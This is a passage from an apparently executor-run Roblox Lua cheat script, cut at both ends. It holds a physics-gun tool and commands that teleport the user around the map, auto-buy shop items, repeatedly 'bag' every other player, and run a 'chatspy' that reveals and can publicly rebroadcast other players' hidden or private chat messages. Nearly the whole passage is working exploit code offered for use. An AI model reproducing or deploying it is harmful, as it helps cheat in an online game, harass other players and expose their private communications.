					local PrimaryPart = Tool and Tool:FindFirstChild("Handle") and Tool.Handle:IsA("BasePart") and Tool.Handle or script.Parent:IsA("Model") and script.Parent.PrimaryPart or Parts[1]

					if PrimaryPart then
						WeldParts(Parts, PrimaryPart, "Weld", false)
					else
						warn("qWeld - Unable to weld part")
					end

					return Tool
				end

				local Tool = PerfectionWeld()


				if Tool and script.ClassName == "Script" then
					--- Don't bother with local scripts

					script.Parent.AncestryChanged:connect(function()
						PerfectionWeld()
					end)
				end

				-- Created by Quenty (@Quenty, follow me on twitter).

			end))
			LocalScript6.Name = "Animate"
			LocalScript6.Parent = Tool0
			table.insert(cors,sandbox(LocalScript6,function()
				local arms = nil
				local torso = nil
				local welds = {}
				local Tool = script.Parent
				local neck = nil
				local orginalC0 = CFrame.new(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)

				function Equip(mouse)
					wait(0.01)
					arms = {Tool.Parent:FindFirstChild("Left Arm"), Tool.Parent:FindFirstChild("Right Arm")}
					head = Tool.Parent:FindFirstChild("Head") 
					torso = Tool.Parent:FindFirstChild("Torso")
					if neck == nil then 
						neck = Tool.Parent:FindFirstChild("Torso").Neck
					end 
					if arms ~= nil and torso ~= nil then
						local sh = {torso:FindFirstChild("Left Shoulder"), torso:FindFirstChild("Right Shoulder")}
						if sh ~= nil then
							local yes = true
							if yes then
								yes = false
								sh[1].Part1 = nil
								sh[2].Part1 = nil
								local weld1 = Instance.new("Weld")
								weld1.Part0 = head
								weld1.Parent = head
								weld1.Part1 = arms[1]
								welds[1] = weld1
								local weld2 = Instance.new("Weld")
								weld2.Part0 = head
								weld2.Parent = head
								weld2.Part1 = arms[2]
								welds[2] = weld2
								-------------------------here
								weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0, math.rad(-90))
								weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-15), 0)
								mouse.Move:connect(function ()
									--local Direction = Tool.Direction.Value 
									local Direction = mouse.Hit.p
									local b = head.Position.Y-Direction.Y
									local dist = (head.Position-Direction).magnitude
									local answer = math.asin(b/dist)
									neck.C0=orginalC0*CFrame.fromEulerAnglesXYZ(answer,0,0)
									wait(0.1)
								end)end
						else
							print("sh")
						end
					else
						print("arms")
					end
				end

				function Unequip(mouse)
					if arms ~= nil and torso ~= nil then
						local sh = {torso:FindFirstChild("Left Shoulder"), torso:FindFirstChild("Right Shoulder")}
						if sh ~= nil then
							local yes = true
							if yes then
								yes = false
								neck.C0 = orginalC0

								sh[1].Part1 = arms[1]
								sh[2].Part1 = arms[2]
								welds[1].Parent = nil
								welds[2].Parent = nil
							end
						else
							print("sh")
						end
					else
						print("arms")
					end
				end
				Tool.Equipped:connect(Equip)
				Tool.Unequipped:connect(Unequip)

				function Animate()
					arms = {Tool.Parent:FindFirstChild("Left Arm"), Tool.Parent:FindFirstChild("Right Arm")}
					if Tool.AnimateValue.Value == "Shoot" then 
						local weld1 = welds[1]
						local weld2 = welds[2]
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-15), 0)
						wait(0.00001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.05, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-15), 0)
						wait(0.00001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.1, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-15), 0)
						wait(0.00001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.3, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-110), math.rad(-15), 0)
						wait(0.00001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.35, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-115), math.rad(-15), 0)
						wait(0.00001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.4, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-120), math.rad(-15), 0)
						wait(0.00001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-15), 0)	
						Tool.AnimateValue.Value = "None"
					end 
					if Tool.AnimateValue.Value == "Reload" then 
						local weld1 = welds[1]
						local weld2 = welds[2]
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.4, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.4, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-95), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.4, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-100), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.4, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-105), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.4, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-110), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.4, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-115), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.45, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-120), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.9, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.5, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-120), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 1, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.55, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-120), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 1.1, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.57, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-120), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 1.2, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.6, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-120), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 1.3, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0.6, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-120), math.rad(-15), 0)
						wait(0.0001)
						weld1.C1 = CFrame.new(-0.5+1.5, 0.8, .9)* CFrame.fromEulerAnglesXYZ(math.rad(290), 0, math.rad(-90))
						weld2.C1 = CFrame.new(-1, 0.8, 0.5-1.5) * CFrame.fromEulerAnglesXYZ(math.rad(-90), math.rad(-15), 0)	
						Tool.AnimateValue.Value = "None"
					end 
				end 

				Tool.AnimateValue.Changed:connect(Animate)

			end))
			Script7.Name = "LineConnect"
			Script7.Parent = Tool0
			Script7.Disabled = true
			table.insert(cors,sandbox(Script7,function()
				wait()
				local check = script.Part2
				local part1 = script.Part1.Value
				local part2 = script.Part2.Value
				local parent = script.Par.Value
				local color = script.Color
				local line = Instance.new("Part")
				line.TopSurface = 0
				line.BottomSurface = 0
				line.Reflectance = .5
				line.Name = "Laser"
				line.Transparency = 0.6
				line.Locked = true
				line.CanCollide = false
				line.Anchored = true
				line.formFactor = 0
				line.Size = Vector3.new(0.4,0.4,1)
				local mesh = Instance.new("BlockMesh")
				mesh.Parent = line
				while true do
					if (check.Value==nil) then break end
					if (part1==nil or part2==nil or parent==nil) then break end
					if (part1.Parent==nil or part2.Parent==nil) then break end
					if (parent.Parent==nil) then break end
					local lv = CFrame.new(part1.Position,part2.Position)
					local dist = (part1.Position-part2.Position).magnitude
					line.Parent = parent
					line.Material = "Neon"
					line.BrickColor = color.Value.BrickColor
					line.Reflectance = color.Value.Reflectance
					line.Transparency = "0.2"
					line.CFrame = CFrame.new(part1.Position+lv.lookVector*dist/2)
					line.CFrame = CFrame.new(line.Position,part2.Position)
					mesh.Scale = Vector3.new(.25,.25,dist)
					wait()
				end
				line:remove()
				script:remove() 
			end))
			LocalScript8.Name = "MainScript"
			LocalScript8.Parent = Tool0
			table.insert(cors,sandbox(LocalScript8,function()
				--Physics gun created by Killersoldier45
				wait() 
				tool = script.Parent
				lineconnect = tool.LineConnect
				object = nil
				mousedown = false
				found = false
				BP = Instance.new("BodyPosition")
				BP.maxForce = Vector3.new(math.huge*math.huge,math.huge*math.huge,math.huge*math.huge) --pwns everyone elses bodyposition
				BP.P = BP.P*10 --faster movement. less bounceback.
				dist = nil
				point = Instance.new("Part")
				point.Locked = true
				point.Anchored = true
				point.formFactor = 0
				point.Shape = 0
				point.Material = 'Neon'
				point.BrickColor = BrickColor.new("Toothpaste")
				point.Size = Vector3.new(1,1,1)
				point.CanCollide = false
				local mesh = Instance.new("SpecialMesh")
				mesh.MeshType = "Sphere"
				mesh.Scale = Vector3.new(.2,.2,.2)
				mesh.Parent = point
				handle = tool.Shoot
				front = tool.Shoot
				color = tool.Shoot
				objval = nil
				local hooked = false 
				local hookBP = BP:clone() 
				hookBP.maxForce = Vector3.new(30000,30000,30000) 

				function LineConnect(part1,part2,parent)
					local p1 = Instance.new("ObjectValue")
					p1.Value = part1
					p1.Name = "Part1"
					local p2 = Instance.new("ObjectValue")
					p2.Value = part2
					p2.Name = "Part2"
					local par = Instance.new("ObjectValue")
					par.Value = parent
					par.Name = "Par"
					local col = Instance.new("ObjectValue")
					col.Value = color
					col.Name = "Color"
					local s = lineconnect:clone()
					s.Disabled = false
					p1.Parent = s
					p2.Parent = s
					par.Parent = s
					col.Parent = s
					s.Parent = workspace
					if (part2==object) then
						objval = p2
					end
				end

				function onButton1Down(mouse)
					if (mousedown==true) then return end
					mousedown = true
					coroutine.resume(coroutine.create(function()
						local p = point:clone()
						p.Parent = tool
						LineConnect(front,p,workspace)
						while (mousedown==true) do
							p.Parent = tool
							if (object==nil) then
								if (mouse.Target==nil) then
									local lv = CFrame.new(front.Position,mouse.Hit.p)
									p.CFrame = CFrame.new(front.Position+(lv.lookVector*1000))
								else
									p.CFrame = CFrame.new(mouse.Hit.p)
								end
							else
								LineConnect(front,object,workspace)
								break
							end
							wait()
						end
						p:remove()
					end))
					while (mousedown==true) do
						if (mouse.Target~=nil) then
							local t = mouse.Target
							if (t.Anchored==false) then
								object = t
								dist = (object.Position-front.Position).magnitude
								break
							end
						end
						wait()
					end
					while (mousedown==true) do
						if (object.Parent==nil) then break end
						local lv = CFrame.new(front.Position,mouse.Hit.p)
						BP.Parent = object
						BP.position = front.Position+lv.lookVector*dist
						wait()
					end
					BP:remove()
					object = nil
					objval.Value = nil
				end

				function onKeyDown(key,mouse) 
					local key = key:lower() 
					local yesh = false 
					if (key=="q") then 
						if (dist>=5) then 
							dist = dist-5 
						end 
					end 
					if key == "" then 
						if (object==nil) then return end 
						for _,v in pairs(object:children()) do 
							if v.className == "BodyGyro" then 
								return nil 
							end 
						end 
						BG = Instance.new("BodyGyro") 
						BG.maxTorque = Vector3.new(math.huge,math.huge,math.huge) 
						BG.cframe = CFrame.new(object.CFrame.p) 
						BG.Parent = object 
						repeat wait() until(object.CFrame == CFrame.new(object.CFrame.p)) 
						BG.Parent = nil 
						if (object==nil) then return end 
						for _,v in pairs(object:children()) do 
							if v.className == "BodyGyro" then 
								v.Parent = nil 
							end 
						end 
						object.Velocity = Vector3.new(0,0,0) 
						object.RotVelocity = Vector3.new(0,0,0) 
					end 
					if (key=="e") then
						dist = dist+5
					end
					if (string.byte(key)==27) then 
						if (object==nil) then return end
						local e = Instance.new("Explosion")
						e.Parent = workspace
						e.Position = object.Position
						color.BrickColor = BrickColor.Black()
						point.BrickColor = BrickColor.White() 
						wait(.48)
						color.BrickColor = BrickColor.White() 
						point.BrickColor = BrickColor.Black() 
					end
					if (key=="") then 
						if not hooked then 
							if (object==nil) then return end 
							hooked = true 
							hookBP.position = object.Position 
							if tool.Parent:findFirstChild("Torso") then 
								hookBP.Parent = tool.Parent.Torso 
								if dist ~= (object.Size.x+object.Size.y+object.Size.z)+5 then 
									dist = (object.Size.x+object.Size.y+object.Size.z)+5 
								end 
							end 
						else 
							hooked = false 
							hookBP.Parent = nil 
						end 
					end 
					if (key=="r") then 
						if (object==nil) then return end 
						color.BrickColor = BrickColor.new("Toothpaste") 
						point.BrickColor = BrickColor.new("Toothpaste") 
						object.Parent = nil 
						wait(.48) 
						color.BrickColor = BrickColor.new("Toothpaste")
						point.BrickColor = BrickColor.new("Toothpaste")
					end 
					if (key=="") then 
						if (object==nil) then return end 
						local New = object:clone() 
						New.Parent = object.Parent 
						for _,v in pairs(New:children()) do 
							if v.className == "BodyPosition" or v.className == "BodyGyro" then 
								v.Parent = nil 
							end 
						end 
						object = New 
						mousedown = false 
						mousedown = true 
						LineConnect(front,object,workspace) 
						while (mousedown==true) do
							if (object.Parent==nil) then break end
							local lv = CFrame.new(front.Position,mouse.Hit.p)
							BP.Parent = object
							BP.position = front.Position+lv.lookVector*dist
							wait()
						end
						BP:remove()
						object = nil
						objval.Value = nil
					end 
					if (key=="") then 
						local Cube = Instance.new("Part") 
						Cube.Locked = true 
						Cube.Size = Vector3.new(4,4,4) 
						Cube.formFactor = 0 
						Cube.TopSurface = 0 
						Cube.BottomSurface = 0 
						Cube.Name = "WeightedStorageCube" 
						Cube.Parent = workspace 
						Cube.CFrame = CFrame.new(mouse.Hit.p) + Vector3.new(0,2,0) 
						for i = 0,5 do 
							local Decal = Instance.new("Decal") 
							Decal.Texture = "http://www.roblox.com/asset/?id=2662260" 
							Decal.Face = i 
							Decal.Name = "WeightedStorageCubeDecal" 
							Decal.Parent = Cube 
						end 
					end 
					if (key=="") then 
						if dist ~= 15 then 
							dist = 15 
						end 
					end 
				end

				function onEquipped(mouse)
					keymouse = mouse
					local char = tool.Parent
					human = char.Humanoid
					human.Changed:connect(function() if (human.Health==0) then mousedown = false BP:remove() point:remove() tool:remove() end end)
					mouse.Button1Down:connect(function() onButton1Down(mouse) end)
					mouse.Button1Up:connect(function() mousedown = false end)
					mouse.KeyDown:connect(function(key) onKeyDown(key,mouse) end)
					mouse.Icon = "rbxassetid:// 509381906"
				end

				tool.Equipped:connect(onEquipped)
			end))
			Part9.Name = "GlowPart"
			Part9.Parent = Tool0
			Part9.Material = Enum.Material.Neon
			Part9.BrickColor = BrickColor.new("Cyan")
			Part9.Transparency = 0.5
			Part9.Rotation = Vector3.new(0, -89.5899963, 0)
			Part9.Shape = Enum.PartType.Cylinder
			Part9.Size = Vector3.new(1.20000005, 0.649999976, 2)
			Part9.CFrame = CFrame.new(-54.8191681, 0.773548007, -0.0522949994, 0.00736002205, 4.68389771e-11, -0.999974668, 4.72937245e-11, 1, 1.41590961e-10, 0.999974668, 5.09317033e-11, 0.00736002252)
			Part9.Color = Color3.new(0.0156863, 0.686275, 0.92549)
			Part9.Position = Vector3.new(-54.8191681, 0.773548007, -0.0522949994)
			Part9.Orientation = Vector3.new(0, -89.5799942, 0)
			Part9.Color = Color3.new(0.0156863, 0.686275, 0.92549)
			Script10.Name = "Glow Script"
			Script10.Parent = Part9
			table.insert(cors,sandbox(Script10,function()
				while true do
					wait(0.05)
					script.Parent.Transparency = .5
					wait(0.05)
					script.Parent.Transparency = .6
					wait(0.05)
					script.Parent.Transparency = .7
					wait(0.05)
					script.Parent.Transparency = .8
					wait(0.05)
					script.Parent.Transparency = .9
					wait(0.05)
					script.Parent.Transparency = .8
					wait(0.05)
					script.Parent.Transparency = .7
					wait(0.05)
					script.Parent.Transparency = .6
					wait(0.05)
					script.Parent.Transparency = .5
				end

			end))
			Part11.Name = "GlowPart"
			Part11.Parent = Tool0
			Part11.Material = Enum.Material.Neon
			Part11.BrickColor = BrickColor.new("Cyan")
			Part11.Transparency = 0.5
			Part11.Rotation = Vector3.new(-89.3799973, -55.7399979, -89.25)
			Part11.Size = Vector3.new(0.280000001, 0.25999999, 0.200000003)
			Part11.CFrame = CFrame.new(-54.9808807, 0.99843204, 0.799362957, 0.00736002205, 0.562958956, -0.826454222, 4.72937245e-11, 0.826475084, 0.56297338, 0.999974668, -0.00414349511, 0.00608287565)
			Part11.Color = Color3.new(0.0156863, 0.686275, 0.92549)
			Part11.Position = Vector3.new(-54.9808807, 0.99843204, 0.799362957)
			Part11.Orientation = Vector3.new(-34.2599983, -89.5799942, 0)
			Part11.Color = Color3.new(0.0156863, 0.686275, 0.92549)
			Script12.Name = "Glow Script"
			Script12.Parent = Part11
			table.insert(cors,sandbox(Script12,function()
				while true do
					wait(0.05)
					script.Parent.Transparency = .5
					wait(0.05)
					script.Parent.Transparency = .6
					wait(0.05)
					script.Parent.Transparency = .7
					wait(0.05)
					script.Parent.Transparency = .8
					wait(0.05)
					script.Parent.Transparency = .9
					wait(0.05)
					script.Parent.Transparency = .8
					wait(0.05)
					script.Parent.Transparency = .7
					wait(0.05)
					script.Parent.Transparency = .6
					wait(0.05)
					script.Parent.Transparency = .5
				end

			end))
			Part13.Name = "GlowPart"
			Part13.Parent = Tool0
			Part13.Material = Enum.Material.Neon
			Part13.BrickColor = BrickColor.new("Cyan")
			Part13.Transparency = 0.5
			Part13.Rotation = Vector3.new(95.1500015, -53.8199997, 98.0799942)
			Part13.Size = Vector3.new(0.280000001, 0.25999999, 0.200000003)
			Part13.CFrame = CFrame.new(-54.5909271, 0.978429973, 0.799362957, -0.0830051303, -0.584483683, -0.807150841, 0.0241250042, 0.808528602, -0.58796227, 0.996258855, -0.0682764053, -0.0530113392)
			Part13.Color = Color3.new(0.0156863, 0.686275, 0.92549)
			Part13.Position = Vector3.new(-54.5909271, 0.978429973, 0.799362957)
			Part13.Orientation = Vector3.new(36.0099983, -93.7599945, 1.70999992)
			Part13.Color = Color3.new(0.0156863, 0.686275, 0.92549)
			Script14.Name = "Glow Script"
			Script14.Parent = Part13
			table.insert(cors,sandbox(Script14,function()
				while true do
					wait(0.05)
					script.Parent.Transparency = .5
					wait(0.05)
					script.Parent.Transparency = .6
					wait(0.05)
					script.Parent.Transparency = .7
					wait(0.05)
					script.Parent.Transparency = .8
					wait(0.05)
					script.Parent.Transparency = .9
					wait(0.05)
					script.Parent.Transparency = .8
					wait(0.05)
					script.Parent.Transparency = .7
					wait(0.05)
					script.Parent.Transparency = .6
					wait(0.05)
					script.Parent.Transparency = .5
				end

			end))
			for i,v in pairs(mas:GetChildren()) do
				v.Parent = game:GetService("Players").LocalPlayer.Backpack
				pcall(function() v:MakeJoints() end)
			end
			mas:Destroy()
			for i,v in pairs(cors) do
				spawn(function()
					pcall(v)
				end)
			end
		end;
	});

addCommand({
		["Name"] = "bagall";
		["Function"] = function()
			bag = true
			repeat
				local cor = coroutine.wrap(function()
					if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("[BrownBag]") then
						takingbag = true
						local cor = coroutine.wrap(function()
							game:GetService("Players").LocalPlayer.Character:MoveTo(Vector3.new(-314.580566, 51.1788902, -727.484558))
						end)
						cor()			
						wait(1)
						fireclickdetector(workspace.Ignored.Shop["[BrownBag] - $25"].ClickDetector, 4)
						wait(0.5)
						game:GetService("Players").LocalPlayer.Backpack["[BrownBag]"].Parent = game:GetService("Players").LocalPlayer.Character
						takingbag = false
					end
				end)
				cor()
				if takingbag == false then
					for i, v in pairs(game:GetService("Players"):GetPlayers()) do
						if v.Character:FindFirstChild("Christmas_Sock") == nil and v.Character:FindFirstChildOfClass("ForceField") == nil and v.Character ~= game:GetService("Players").LocalPlayer.Character then
							local chars = v.Character
							if game:GetService("Players").LocalPlayer.Character:FindFirstChild("[BrownBag]") then
								game:GetService("Players").LocalPlayer.Character["[BrownBag]"]:Activate()
							end
							game:GetService("Players").LocalPlayer.Character:MoveTo(v.Character.UpperTorso.Position)
						end
						wait(0.005)
					end
				end
				wait()
			until bag == false
		end;
	});

	addCommand({
		["Name"] = "bagall";
		["Function"] = function()
			bag = false
		end;
	});

	addCommand({
		["Name"] = "stopbaggingeveryone";
		["Function"] = function()
			bag = false
		end;
	});

	addCommand({
		["Name"] = "autoeat";
		["Function"] = function()
			gsPlayers = game:GetService("Players")
			gsWorkspace = game:GetService("Workspace")
			gsLighting = game:GetService("Lighting")
			gsReplicatedStorage = game:GetService("ReplicatedStorage")
			gsCoreGui = game:GetService("CoreGui")
			gsTween = game:GetService("TweenService")
			gsHttp = game:GetService("HttpService")

			LP = gsPlayers.LocalPlayer
			Mouse = LP:GetMouse()

			while wait() do
				pcall(function()
					if game.Players.LocalPlayer.Character.Humanoid.Health <= 20 then
						SavedPosition = ""
						SavedPosition = LP.Character.HumanoidRootPart.CFrame
						game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-793.978027, -39.6492004, -938.048706)
						wait(.5)

						fireclickdetector(game.Workspace.Ignored.Shop['[Chicken] - $7'].ClickDetector)
						fireclickdetector(game.Workspace.Ignored.Shop['[Chicken] - $7'].ClickDetector)
						wait(.2)

						local Players = game:GetService("Players")
						local Client = Players.LocalPlayer

						local ToolName = "[Chicken]"
						if Client.Backpack:FindFirstChild(ToolName) then
							Client.Backpack[ToolName].Parent = Client.Character
							wait(.2)
							if game.Players.LocalPlayer.Character:FindFirstChild("[Chicken]") then
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
								wait(0.6)
								game.Players.LocalPlayer.Character["[Chicken]"]:Activate()
							end
							if SavedPosition ~= "" then
								LP.Character.HumanoidRootPart.CFrame = SavedPosition
							end;
						end;
					end;
				end);
			end;
		end;
	});

	addCommand({
		["Name"] = "boneless";
		["Function"] = function()
			sendNotif("", "Boneless Enabled.", 15);
			local Stuff = {
				"RightHand",
				"LeftHand",
				"RightUpperArm",
				"RightLowerArm",
				"LeftUpperArm",
				"LeftLowerArm",
				"Head",
				"UpperTorso"
			}

			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
					for z, AdminName in ipairs(Stuff) do
						if v.Name == AdminName then
							if v:FindFirstChildOfClass("Motor6D") then
								local Weld = v:FindFirstChildOfClass("Motor6D")
								Weld:Destroy()
							end
						end
					end
				end
			end)
		end;
	});

	addCommand({
		["Name"] = "chatspy";
		["Function"] = function()
			sendOutput(" Chat Spy Enabled.");
			enabled = true
			spyOnMyself = false
			public = false
			publicItalics = true
			privateProperties = {
				Color = Color3.fromRGB(0, 255, 255);
				Font = Enum.Font.SourceSansBold;
				TextSize = 18;
			}
			local StarterGui = game:GetService("StarterGui")
			local Players = game:GetService("Players")
			local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
			local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
			local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
			local instance = (_G.chatSpyInstance or 0) + 1
			_G.chatSpyInstance = instance

			local function onChatted(p, msg)
				if _G.chatSpyInstance == instance then
					if p == player and msg:lower():sub(1, 4) == "/spy" then
						enabled = not enabled
						wait(0.3)
						privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
						StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
					elseif enabled and (spyOnMyself == true or p ~= player) then
						msg = msg:gsub("[\n\r]", ''):gsub("\t", ' '):gsub("[ ]+", ' ')
						local hidden = true
						local conn = getmsg.OnClientEvent:Connect(function(packet, channel)
							if packet.SpeakerUserId == p.UserId and packet.Message == msg:sub(#msg - #packet.Message + 1) and (channel == "All" or (channel == "Team" and public == false and Players[packet.FromSpeaker].Team == player.Team)) then
								hidden = false
							end
						end)
						wait(1)
						conn:Disconnect()
						if hidden and enabled then
							if public then
								saymsg:FireServer((publicItalics and "/me " or '').."{SPY} ["..p.Name.."]: "..msg, "All")
							else
								privateProperties.Text = "{SPY} ["..p.Name.."]: "..msg
								StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
							end
						end
					end
				end
			end

			for _, p in ipairs(Players:GetPlayers()) do
				p.Chatted:Connect(function(msg)
					onChatted(p, msg)
				end)
			end
			Players.PlayerAdded:Connect(function(p)
				p.Chatted:Connect(function(msg)
					onChatted(p, msg)
				end)
			end)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
			if not player.PlayerGui:FindFirstChild("Chat") then
				wait(3)
			end
			local chatFrame = player.PlayerGui.Chat.Frame
			chatFrame.ChatChannelParentFrame.Visible = true
			chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), chatFrame.ChatChannelParentFrame.Size.Y)
		end;
	});

	addCommand({
		["Name"] = "shottyammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[20 [Shotgun Ammo] - $60]' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-800.960022, -42.5478363, -931.500061, 5.96046448e-08, 0.000122077763, 1, -0.000610388757, 0.999999821, -0.000122077705, -0.999999762, -0.000610388757, 1.1920929e-07)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[20 [Shotgun Ammo] - $60]") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["20 [Shotgun Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
			end
		end;
	});

	addCommand({
		["Name"] = "rpgammo";
		["Function"] = function()
